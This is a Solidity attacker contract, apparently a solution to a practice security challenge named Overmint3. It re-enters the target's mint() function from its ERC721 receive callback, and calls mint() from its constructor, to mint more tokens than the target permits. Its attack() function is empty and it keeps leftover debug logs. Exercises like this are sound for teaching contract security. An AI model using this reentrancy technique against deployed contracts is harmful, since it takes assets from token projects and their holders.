// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./Overmint3.sol";
import "hardhat/console.sol";

contract Overmint3Attacker is IERC721Receiver {
    using Address for address;
    
    Overmint3 overmint3;
    
    constructor(Overmint3 _overmint3) {
        overmint3 = _overmint3;
        _overmint3.mint();
    }

    function attack() external {

    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        console.log('token received');
        if (overmint3.balanceOf(address(this)) < 5) {
            overmint3.mint();
        }
        console.log('hi');
        return IERC721Receiver.onERC721Received.selector;
    }
}
